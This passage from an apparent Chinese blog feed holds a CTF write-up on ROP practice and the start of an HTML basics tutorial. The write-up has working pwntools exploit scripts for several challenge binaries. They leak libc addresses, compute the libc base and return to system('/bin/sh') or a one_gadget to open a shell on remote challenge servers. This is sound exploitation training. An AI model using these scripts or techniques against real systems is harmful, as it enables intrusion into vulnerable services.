src="/2020/02/03/ROP练习/images/15807186890200.jpg" srcset="/img/loading.gif" alt="-w373"><br>可以看出其取了一个随机数，存入buf。<br><img src="/2020/02/03/ROP练习/images/15807187726931.jpg" srcset="/img/loading.gif" alt="-w413"><br>然后进入这个函数分析，看到接收buf传来的值，放入s中。然后下面接收你传入的东西，与s判断是否相同，不相同就会退出。然后如果不退出返回值是v5，但是这里的v5在函数中是没有经过处理的。看一下汇编：<br><img src="/2020/02/03/ROP练习/images/15807191082469.jpg" srcset="/img/loading.gif" alt="-w508"><br>v5咱们想控制，就只能通过原来那个read函数，咱们传入的值去控制。返回值给v2，然后v2作为参数然后进入下面这个带有溢出的函数中。<br> <img src="/2020/02/03/ROP练习/images/15807191871406.jpg" srcset="/img/loading.gif" alt="-w375"><br>观察后，可以看出咱们应该把这个返回的参数整的大一点，方便进行写ROP链。</p><h4 id="分析总结"><a href="#分析总结" class="headerlink" title="分析总结"></a>分析总结</h4><p>其中对于绕过相等判断，可以利用一下strlen函数的特性，然后直接用<code>\x00</code>来截断。<br>v5这个返回参数可以控制为’\xff’,然后进入带有溢出的函数，写rop链就行了。<br>先用puts函数泄露出<code>__libc_start_main</code>的地址，然后在给的libc中确认下symbols，然后拿到libc基址，然后直接利用one gadget RCE即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import time# io = process(&#39;./pwn&#39;)io = remote(&#39;node3.buuoj.cn&#39;,27780)libc = ELF(&#39;./libc-2.23.so&#39;)# blibc = ELF(&#39;/lib/i386-linux-gnu/libc-2.23.so&#39;)elf = ELF(&#39;./pwn&#39;)# raw_input(&#39;-&gt;&#39;)p1 = &#39;\x00&#39;.ljust(8,&#39;\xff&#39;) offset = 0xe7 + 4io.send(p1 + &#39;\n&#39;)io.recvline_contains(&#39;Correct&#39;)start_add=0x080485A0put_add = elf.symbols[&#39;puts&#39;]libc_start_add = elf.got[&#39;__libc_start_main&#39;]rop1 = [    put_add,    start_add,    libc_start_add]p2 = offset * &#39;\x00&#39; + &#39;&#39;.join(map(p32,rop1))io.sendline(p2)sleep(1)libc_base = u32(io.recv(4)) - libc.symbols[&#39;__libc_start_main&#39;]REC = libc_base+0x3a80cprint(&#39;libc_base :&#39;+hex(libc_base))offset = 0xe7 + 4io.send(p1 + &#39;\n&#39;)io.recvline_contains(&#39;Correct&#39;)p3 = offset * &#39;\x00&#39; + p32(REC)io.sendline(p3)io.interactive()</code></pre><h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="HarekazeCTF2019_baby_rop"></a>HarekazeCTF2019_baby_rop</h2><h3 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15807395869628.jpg" srcset="/img/loading.gif" alt="-w624"></p><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  char v4; // [rsp+0h] [rbp-10h]  system(&quot;echo -n \&quot;What&#39;s your name? \&quot;&quot;);  __isoc99_scanf(&quot;%s&quot;, &amp;v4);  printf(&quot;Welcome to the Pwn World, %s!\n&quot;, &amp;v4);  return 0;}</code></pre><p>程序十分简单，给了system函数，且明显存在溢出。<br><img src="/2020/02/03/ROP练习/images/15807396970009.jpg" srcset="/img/loading.gif" alt="-w502"><br>ida查看字符串，该可以发现<code>/bin/sh</code>/，这构造个简单rop链直接利用就好了。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *import time# io = process(&#39;./babyrop&#39;)io = remote(&#39;node3.buuoj.cn&#39;,28633)elf = ELF(&#39;./babyrop&#39;)offset = 0x10 + 8binsh_add = 0x0601048pop_rdi_ret=0x000400683 system_add = elf.symbols[&#39;system&#39;]# io.recvline_contains(&#39;your&#39;)# raw_input(&#39;-&gt;&#39;)p = &#39;a&#39; * offset + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add)io.sendline(p)io.interactive()</code></pre><p>拿到shell后，这个题buuctf根目录下没有flag文件。需要<code>find / -name &quot;flag&quot;</code> 可以查到是在<code>/home/babyrop/flag</code>这个目录下。</p><h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="HarekazeCTF2019_baby_rop2"></a>HarekazeCTF2019_baby_rop2</h2><h3 id="查保护和arch-2"><a href="#查保护和arch-2" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15808200972779.jpg" srcset="/img/loading.gif" alt="-w310"></p><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15808200578822.jpg" srcset="/img/loading.gif" alt="-w577"><br>函数过程很简单，明显栈溢出，思路就是先栈溢出构造rop链，让pintf函数打印出<code>__libc_start_main</code>函数在内存的地址，然后在给的libc文件中获取一下其sympol是的值，然后再计算出它的基址，再让函数返回到shart处清理一下栈，然后再次利用onegadget RCE构造相关rop链即可。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *import timeio = process(&#39;./babyrop2&#39;)# blibc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;)# context.log_level = &#39;debug&#39;libc = ELF(&#39;./libc.so.6&#39;)io = remote(&#39;node3.buuoj.cn&#39;,27694)elf = ELF(&#39;./babyrop2&#39;)offset = 40__libc_start_add = elf.got[&#39;__libc_start_main&#39;]start_add = 0x0400540 printf_add = elf.symbols[&#39;printf&#39;]aWelcomeToThePw = 0x400770 pop_rdi_ret= 0x000400733pop_rsi_r15_ret = 0x00400731 libc_start_sys = libc.symbols[&#39;__libc_start_main&#39;]rop1 = [    pop_rdi_ret,    aWelcomeToThePw,    pop_rsi_r15_ret,    __libc_start_add,    0,    printf_add,    start_add]io.recvuntil(&#39;e? &#39;)# io.recvuntil(&#39;again, &#39;)# raw_input(&#39;-&gt;&#39;)p = &#39;a&#39; * offset + &#39;&#39;.join(map(p64,rop1))io.sendline(p)io.recvline_contains(&#39;again&#39;)s = io.recvline_contains(&#39;again&#39;)libc_base = int(u64(s[32:38].ljust(8,&#39;\x00&#39;))) - libc_start_sysRCE = libc_base + 0x4526aprint(&#39;libc_base:&#39;+hex(libc_base))io.recvuntil(&#39;name? &#39;)# io.recvuntil(&#39;name? &#39;)p = &#39;\x00&#39; * offset + p64(RCE) + &#39;\x00&#39; * 70sleep(1)raw_input(&#39;-&gt;&#39;)io.sendline(p)io.interactive()</code></pre><h1 id="无libc"><a href="#无libc" class="headerlink" title="无libc"></a>无libc</h1><p>这一部分目前主要是利用LibcSearcher来做的，有时候题目不给libc，用这个也可以解决部分题目。~~用这个以后就不能很方便的用onegadget去一键拿shell了，感觉还是有办法的，想办法拿到LibcSearcher获取到的libc版本就好了，找个时间去实践一下，先慢慢构建rop链就好，正好练习一下这种方法拿shell。~~<br>已经测试出办法咯。<br><code>https://github.com/lieanu/LibcSearcher</code></p><h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><h3 id="查保护和arch-3"><a href="#查保护和arch-3" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15808195388315.jpg" srcset="/img/loading.gif" alt="-w408"></p><h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15808195745508.jpg" srcset="/img/loading.gif" alt="-w436"><br>函数十分简单，明显栈溢出，思路就是先栈溢出构造rop链，让puts函数打印出<code>__libc_start_main</code>函数的地址，然后再用libcsearcher来获取一下它的libc版本，然后再计算出它的基址，再让函数返回到最初清理一下栈，然后再次进行溢出构造关于<code>system(&#39;/bin/sh&#39;)</code>的rop链即可。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *from LibcSearcher import *import time# context.log_level = &#39;debug&#39;io = remote(&#39;node3.buuoj.cn&#39;,28661)# io = process(&#39;./bjdctf_2020_babyrop&#39;)elf = ELF(&#39;./bjdctf_2020_babyrop&#39;)# blibc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;)io.recvuntil(&#39;story!\n&#39;)padding = 40libc_main_add = elf.got[&#39;__libc_start_main&#39;]puts_add = elf.symbols[&#39;puts&#39;]pop_rdi_ret = 0x0400733 p = &#39;a&#39;*padding + p64(pop_rdi_ret) + p64(libc_main_add) + p64(puts_add) + p64(0x400530)io.sendline(p)s = u64(io.recv(6).ljust(8,&#39;\x00&#39;))print(hex(s))obj = LibcSearcher(&quot;__libc_start_main&quot;,s)libc_base = s - obj.dump(&quot;__libc_start_main&quot;)system_add = libc_base + obj.dump(&quot;system&quot;)binsh_add = libc_base + obj.dump(&quot;str_bin_sh&quot;)sleep(1)io.recvuntil(&#39;story!\n&#39;)p = &#39;a&#39;*padding + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add)io.sendline(p)io.interactive()</code></pre><h2 id="unctf-easyrop"><a href="#unctf-easyrop" class="headerlink" title="unctf_easyrop"></a>unctf_easyrop</h2><h3 id="查保护和arch-4"><a href="#查保护和arch-4" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15808809043718.jpg" srcset="/img/loading.gif" alt="-w432"></p><h3 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15808809641958.jpg" srcset="/img/loading.gif" alt="-w397"><br>主程序主要就是限制了v2需要等于<code>ffff</code>才能进入带有溢出的函数，v2的值是<br><img src="/2020/02/03/ROP练习/images/15808810282809.jpg" srcset="/img/loading.gif" alt="-w381"><br>这个在read的时候把控好，让ffff填入这个位置即可。<br><img src="/2020/02/03/ROP练习/images/15808811265759.jpg" srcset="/img/loading.gif" alt="-w407"><br>然后进入这个带有溢出漏洞的函数，可以看到buf的首地址是<code>ebp-0x10</code>，<img src="/2020/02/03/ROP练习/images/15808812877029.jpg" srcset="/img/loading.gif" alt="-w478"><br>然后分析下这里的汇编，它把read函数的溢出位置返回值<code>ebp-0x14</code>取出来，与<code>0x8050000</code>进行比较。<br><img src="/2020/02/03/ROP练习/images/15808814707476.jpg" srcset="/img/loading.gif" alt="-w385"><br>也可以看出，这里是防止我们进行ret2libc的。那我们构造这里可以用一个ret来进行绕过。</p><h4 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h4><p>先控制好v2让其等于<code>ffff</code>，然后进入带有溢出的函数，然后构造rop链，先把<code>__libc_start_main</code>的内存地址泄露出来，然后用libcseacher来确定libc版本，<br>然后dump出<code>__libc_start_main的sympols</code>,算出基址后，接着返回到开始处清理一下栈，再次溢出跟原来一样。然后再次构造rop链的时候，注意ret绕过对咱们溢出地址的检测，在调用system(‘/bin/sh’)即可。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *from LibcSearcher import *import time# context.log_level = &#39;debug&#39;io = process(&#39;./easyrop&#39;)# io = remote(&#39;183.129.189.60&#39;,10011)io.recvuntil(&#39;TFer!\n&#39;)e =ELF(&#39;./easyrop&#39;)raw_input(&#39;-&gt;&#39;)padding = 36start_add = 0x08048400libc_start_main = e.got[&#39;__libc_start_main&#39;]puts_add = e.symbols[&#39;puts&#39;]ret = 0x0804839ep = &#39;f&#39; * paddingrop1 = [    puts_add,    start_add,    libc_start_main]io.sendline(p)io.recvuntil(&#39;name?\n&#39;)p = &#39;\x00&#39; * 0x18 + &#39;&#39;.join(map(p32,rop1))raw_input(&#39;&gt;&#39;)io.sendline(p)libc_start_add = u32(io.recv(4))obj = LibcSearcher(&quot;__libc_start_main&quot;,libc_start_add)libc_base = libc_start_add - obj.dump(&quot;__libc_start_main&quot;)print(libc_base)system_add = obj.dump(&#39;system&#39;) + libc_basebinsh_add = obj.dump(&#39;str_bin_sh&#39;) + libc_baseio.recvuntil(&#39;TFer!\n&#39;)p = &#39;f&#39; * paddingio.sendline(p)io.recvuntil(&#39;name?\n&#39;)rop2 = [    ret,    system_add,    start_add,    binsh_add]p = &#39;\x00&#39; * 0x14 + &#39;&#39;.join(map(p32,rop2))sleep(1)io.sendline(p)io.interactive()</code></pre><h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><h3 id="查保护和arch-5"><a href="#查保护和arch-5" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15813386440906.jpg" srcset="/img/loading.gif" alt="-w512"><br>32位</p><h3 id="ida分析-5"><a href="#ida分析-5" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  be_nice_to_people();  vulnerable_function();  return write(1, &quot;Hello, World\n&quot;, 0xDu);}</code></pre><p>主函数很简单，漏洞函数是在第二个函数。<br><img src="/2020/02/03/ROP练习/images/15813387437739.jpg" srcset="/img/loading.gif" alt="-w344"><br>栈溢出，然后直接构造rop链即可。<br><img src="/2020/02/03/ROP练习/images/15813388677907.jpg" srcset="/img/loading.gif" alt="-w322"><br>利用思路：用wirte函数泄露出<code>__libc_start_main</code>在内存地址，然后返回start清理一下栈，用libcseacher确定下libc版本，然后进行构造system(‘/bin/sh’)的rop链即可。</p><p>这个我是发现可以用libcseacher确定libc版本后，用one_gadget工具计算RCE位置，然后实现ret to RCE。libcseacher获取到leak地址后，在执行dump libc前的时候，会告诉你，它确定的libc版本号是多少。<br><img src="/2020/02/03/ROP练习/images/15813393524855.jpg" srcset="/img/loading.gif" alt="-w1217"><br>这个是让你选择的。<br><img src="/2020/02/03/ROP练习/images/15813394033522.jpg" srcset="/img/loading.gif" alt="-w826"></p><p><img src="/2020/02/03/ROP练习/images/15813392212443.jpg" srcset="/img/loading.gif" alt="-w1200"><br>在下载的libcseacher时候，其实它是有个数据库的，这里面存着各种libc版本，方便咱们使用。那这个时候，直接用one_gadget 计算下RCE偏移即可。<br><img src="/2020/02/03/ROP练习/images/15813395195579.jpg" srcset="/img/loading.gif" alt="-w1030"></p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *from LibcSearcher import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;elf = ELF(&#39;./2018_rop&#39;)# io = process(&#39;./2018_rop&#39;)io = remote(&#39;node3.buuoj.cn&#39;,29692)padding = 140 write_plt = elf.symbols[&#39;write&#39;]libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]start = 0x080483C0 p = padding * &#39;\x00&#39; + flat([write_plt,start,1,libc_start_main_got,0x10])# raw_input(&#39;-&gt;&#39;)io.sendline(p)libc_start_main_add = u32(io.recv(4))obj = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_add)libc_base = libc_start_main_add - obj.dump(&#39;__libc_start_main&#39;)system_add = libc_base + obj.dump(&#39;system&#39;)binsh_add = libc_base + obj.dump(&#39;str_bin_sh&#39;)# print(libc.symbols[&#39;__libc_start_main&#39;])print(hex(libc_base))# io.recvline()RCE = libc_base + 0x3cbecp = padding * &#39;\x00&#39; + p32(RCE) + padding * &#39;\x00&#39;# p = padding * &#39;\x00&#39; + p32(system_add) + p32(start) + p32(binsh_add)io.sendline(p)io.interactive()</code></pre><p>这里面两种办法都行。</p><h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h2><h3 id="查保护和arch-6"><a href="#查保护和arch-6" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><pre><code> Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析-6"><a href="#ida分析-6" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15814340991655.jpg" srcset="/img/loading.gif" alt="-w601"><br>主函数十分简单，漏洞在vuln函数：<br><img src="/2020/02/03/ROP练习/images/15814341281175.jpg" srcset="/img/loading.gif" alt="-w389"><br>padding为 6c+4 个字节。跟上题很像的攻击思路，直接给exp了。</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *from LibcSearcher import *# io = process(&#39;./bof&#39;)io = remote(&#39;node3.buuoj.cn&#39;,27178)elf = ELF(&#39;./bof&#39;)libc = elf.libccontext.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;padding = 112start_add = 0x080483E0libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]write_plt = elf.symbols[&#39;write&#39;]io.recvuntil(&#39;2015~!\n&#39;)p = padding * &#39;\x00&#39; + flat([write_plt,start_add,1,libc_start_main_got,0x10])io.sendline(p)libc_start_main_add = u32(io.recv(4))obj = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_add)libc_base = libc_start_main_add - obj.dump(&#39;__libc_start_main&#39;)print(hex(libc_start_main_add))print(hex(libc_base))io.recvuntil(&#39;2015~!\n&#39;)rce = libc_base + 0x3a80cp = padding * &#39;\x00&#39; + p32(rce) + padding * &#39;\x00&#39;io.sendline(p)io.interactive()</code></pre><p>还是本地来base库查libc的one_gadget，然后ret to rce。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ROP题目练习&quot;&gt;&lt;a href=&quot;#ROP题目练习&quot; class=&quot;headerlink&quot; title=&quot;ROP题目练习&quot;&gt;&lt;/a&gt;ROP题目练习&lt;/h1&gt;&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前
      
    
    </summary>
    
    
      <category term="ROP" scheme="http://chumen77.xyz/tags/ROP/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HTML 基础</title>
    <link href="http://chumen77.xyz/2019/12/29/HTML%20%E5%9F%BA%E7%A1%80/"/>
    <id>http://chumen77.xyz/2019/12/29/HTML 基础/</id>
    <published>2019-12-29T13:42:51.000Z</published>
    <updated>2020-02-28T07:52:37.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HTML-基础"><a href="#HTML-基础" class="headerlink" title="HTML 基础"></a>HTML 基础</h2><ol><li><strong>HTML标题</strong>：是通过 <code>&lt;h1&gt; - &lt;h6&gt;</code> 标签来定义的.；其会因为数字变化而显示的字体大小变化；</li><li><strong>HTML段落</strong>：通过标签<code>&lt;p&gt;</code> 来定义的.</li><li><strong>HTML链接</strong>：通过标签<code>&lt;a&gt;</code>来定义的。</li><li><strong>HTML图像</strong>：通过标签 <code>&lt;img&gt;</code> 来定义的。</li></ol><h2 id="HTML-文本"><a href="#HTML-文本" class="headerlink" title="HTML 文本"></a>HTML 文本</h2><h4 id="HTML-标题"><a href="#HTML-标题" class="headerlink" title="HTML 标题"></a>HTML 标题</h4><p>标题（Heading）是通过<code>&lt;h1&gt; - &lt;h6&gt;</code> 标签进行定义的.<code>&lt;h1&gt;</code> 定义最大的标题。 <code>&lt;h6&gt;</code>定义最小的标题。<strong>浏览器会自动地在标题的前后添加空行。</strong></p><ul><li><p>标题很重要：</p><p>不要仅仅是为了生成<strong>粗体</strong>或<strong>大号</strong>的文本而使用标题，而是==为了用户可以通过标题来快速浏览您的网页应该将 h1 用作主标题==（最重要的），其后是 h2（次重要的），再其次是 h3，以此类推。</p></li></ul><h4 id="HTML-注释"><a href="#HTML-注释" class="headerlink" title="HTML 注释"></a>HTML 注释</h4><p><strong>注释</strong>： 开始括号之后（左边的括号）需要紧跟一个叹号，结束括号之前（右边的括号）不需要，合理地使用注释可以对未来的代码编辑工作产生帮助。。</p><pre><code class="html">&lt;!-- 这是一个注释 --&gt;</code></pre><h4 id="HTML-段落"><a href="#HTML-段落" class="headerlink" title="HTML 段落"></a>HTML 段落</h4><p>浏览器会自动地在段落的前后添加空行。<strong>（<code>&lt;/p&gt;</code>是块级元素）</strong></p><h4 id="HTML-水平线"><a href="#HTML-水平线" class="headerlink" title="HTML 水平线"></a>HTML 水平线</h4><p>1：<code>&lt;hr&gt;</code>标签在 HTML 页面中创建水平线。</p><h4 id="HTML-文本格式化"><a href="#HTML-文本格式化" class="headerlink" title="HTML 文本格式化"></a>HTML 文本格式化</h4><p>通常用到<code>&lt;strong&gt;&lt;em&gt;&lt;del&gt;</code>这几个标签。</p><h4 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h4><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;文本&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;!-- &lt;h1&gt;标题1&lt;/h1&gt;    &lt;h2&gt;标题2&lt;/h2&gt;    &lt;h3&gt;标题3&lt;/h3&gt;    &lt;h4&gt;标题4&lt;/h4&gt;    &lt;h5&gt;标题5&lt;/h5&gt;    &lt;h6&gt;标题6&lt;/h6&gt; --&gt;    &lt;!-- &lt;h&gt;标签有大小之分 --&gt;        &lt;h2&gt;五花山&lt;/h2&gt;        &lt;p&gt;我家住在大山里。你知道这里的山是什么颜色的吗？&lt;/p&gt;        &lt;p&gt;春天的山是绿色的，那绿色淡淡的，许多树叶刚冒出芽来，还带着嫩嫩的黄色呢。&lt;/p&gt;        &lt;p&gt;夏天的山也是绿色的，那绿色浓浓的，一片片树叶，不管是大的还是小的，都像被绿油彩涂过，连雨点落上去，都给染绿了。&lt;/p&gt;        &lt;p&gt;秋天的山不再是一种颜色了。下过一场秋霜有的树林变成了金黄色□好像所有的阳光都集中到那儿去了有的树林变成了杏黄色远远望去，就像枝头挂满了熟透的杏和梨；有的树林变成了火红色，风一吹，树林跳起舞来，就像一簇簇火苗在跳跃；还有的树林变得紫红紫红，跟剧场里的紫绒幕布的颜色一样。只有松柏不怕秋霜，针一样的叶子还是那么翠绿。&lt;/p&gt;        &lt;p&gt;秋天的山一片金黄，一片火红，一片翠绿……人们给这五颜六色的山起了个好听的名字，叫“&lt;strong&gt;&lt;em&gt; &lt;del&gt;五花山&lt;/del&gt;&lt;/em&gt;&lt;/strong&gt;”。&lt;/p&gt;  &lt;!-- 几个标签的嵌套 --&gt;         &lt;strong&gt;加粗&lt;/strong&gt; &lt;em&gt;斜体&lt;/em&gt; &lt;del&gt;删除文字&lt;/del&gt;&lt;!-- &lt;span&gt;配合css&lt;/span&gt; --&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>效果：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/wenben.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML-图像"><a href="#HTML-图像" class="headerlink" title="HTML 图像"></a>HTML 图像</h2><p> ==<strong>HTML 图像-</strong>== ：</p><ol><li>标签（ <code>&lt;img&gt;</code>）是空标签，意思是说，它只包含属性，并且没有闭合标签。</li><li>源属性（<code>&lt;src&gt;</code>）是图像的 URL 地址。分为本地和网上，本地图片写路径的时候注意<strong>绝对路径和相对路径</strong>（可以用<code>../</code>来返回 一级目录，返回几级目录就写几个它就行)。</li><li>Alt属性:alt 属性用来为图像定义一串预备的可替换的文本,在浏览器无法载入图像时,告用户图片的信息。<strong>==搜索引擎也是通过此描述来收集图片的==</strong>.</li><li>高度与宽度:height（高度） 与 width（宽度）属性用于设置图像的高度与宽度。属性值默认单位为像素px。</li></ol><p>练习：</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;图片&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;img src=&quot;1.png&quot; alt=&quot;chumen的qq图像&quot; title=&quot;chumen的qq图像&quot;&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="图片的映射"><a href="#图片的映射" class="headerlink" title="图片的映射"></a>图片的映射</h4><p>目标是为了在一张图片上的<strong>某个位置</strong>点击后<strong>才</strong>可以实现某个功能。</p><p>这需要用到<code>usemap=&quot;#diyname&quot;</code> 然后用<code>&lt;map name=&quot;diyname&quot;&gt;&lt;/map&gt;</code>标签来对应。</p><p>核心代码：`<map name="1map"></map></p><pre><code>    &lt;area shape=&quot;&quot; coords=&quot;&quot; href=&quot;&quot;&gt;</code></pre><p>\\`</p><p>shape是选择的形状，coords是坐标，坐标确定<strong>推荐用qq的截图功能那里来确定</strong>，比如：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/quzuobiao.jpg?raw=true" srcset="/img/loading.gif" alt></p><p>那这个彩色箭头指的位置就是在这个图像的（233,456）位置。</p><p><strong>练习：</strong></p><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;图片的映射&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;img src=&quot;1.png&quot; alt=&quot;&quot; usemap=&quot;#1map&quot;&gt;    &lt;map name=&quot;1map&quot;&gt;        &lt;area shape=&quot;circle&quot; coords=&quot;300,255,50&quot; target=&quot;_blank&quot; href=&quot;http://www.baidu.com&quot;&gt;    &lt;/map&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>效果</strong>：<img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/yingshe.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML-超链接"><a href="#HTML-超链接" class="headerlink" title="HTML 超链接"></a>HTML 超链接</h2><p>超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，您可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。使用标签 <code>&lt;a&gt;</code>来设置超文本链接。</p><ul><li><p><strong>HTML 链接语法</strong>:<code>&lt;a href=&quot;url&quot;&gt;链接文本&lt;/a&gt;</code>  ,href 属性描述了链接的目标。</p></li><li><p><strong>target 属性</strong>  :<code>target=&quot;_blank&quot;</code>效果就是在新窗口（空白界面）做出来 。</p></li><li><p><strong>id 属性</strong>:id属性可用于创建在一个HTML文档书签标记,在HTML文档中插入ID:</p><p><code>&lt;a id=&quot;tips&quot;&gt;有用的提示部分&lt;/a&gt;</code> </p><p>在HTML文档中创建一个链接到”有用的提示部分(id=”tips”）”:</p><p><code>&lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt;</code></p></li></ul><p><strong>解释加补充</strong>：ID 属性名字只能有一个不可重复，且必须以==字母==开头，可以在一个界面的任何位置的内容进行设置ID，在设置完后，（<code>&lt;a href=&quot;# &quot;&gt;</code>），在==“#”==后加入id的名称即可跳转到你设置ID的内容处。</p><p><code>&lt;a name=&quot;end&quot;&gt;&lt;/a&gt;</code> <code>&lt;a href=&quot;#end&quot;&gt;end&lt;/a&gt;</code>    <strong>做锚点时，替换id的方法，作用可以实现一样！id不好用时用这个</strong></p><p><strong>练习：</strong>（为了方便阅读，省略了很多的<code>&lt;br&gt;</code>.）</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;超级链接&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;a href=&quot;http://www.mi.com&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;1.png&quot;&gt;&lt;/a&gt;    &lt;!-- /*书签标记：锚点*/ --&gt;    &lt;a href=&quot;#end&quot;&gt;end&lt;/a&gt;&lt;br id=&quot;aa&quot;&gt;&lt;br&gt;&lt;br id=&quot;miao&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a name=&quot;miao&quot;&gt;&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;a name=&quot;end&quot;&gt;&lt;/a&gt;  &lt;a href=&quot;#miao&quot;&gt;miao&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="HTML-列表"><a href="#HTML-列表" class="headerlink" title="HTML 列表"></a>HTML 列表</h2><ul><li><strong>HTML无序列表</strong>：<code>&lt;ul&gt;</code>与 <code>&lt;li&gt;</code>其点的样式(圆圈，圆心，正方形）用<strong>css</strong>来控制<code>&lt;ul style=&quot;list-style-type:circle&quot;&gt;</code></li><li><strong>HTML 有序列表</strong> <code>&lt;ol&gt;</code>与<code>&lt;li&gt;</code>   用法和无序相似，<strong>且有序与无序之间可以互相嵌套</strong>，<strong>嵌套过程中点的形状也会自动变化。</strong></li><li><strong>HTML 自定义列表</strong>：这个是比较常用的，自定义列表以<code>&lt;dl&gt;</code> 标签开始。每个自定义列表项以 <code>&lt;dt&gt;</code> 开始。每个自定义列表项的定义以 <code>&lt;dd&gt;</code>开始。其<strong>不仅仅是一列项目，而是项目及其注释的组合。</strong></li></ul><pre><code class="html">&lt;dl&gt;&lt;dt&gt;Coffee&lt;/dt&gt;    &lt;!-- 列表标题 --&gt;&lt;dd&gt;- black hot drink&lt;/dd&gt;   &lt;!-- 其内容 --&gt;&lt;dt&gt;Milk&lt;/dt&gt; &lt;dd&gt;- white cold drink&lt;/dd&gt;&lt;/dl&gt;</code></pre><p><strong>练习：</strong></p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html 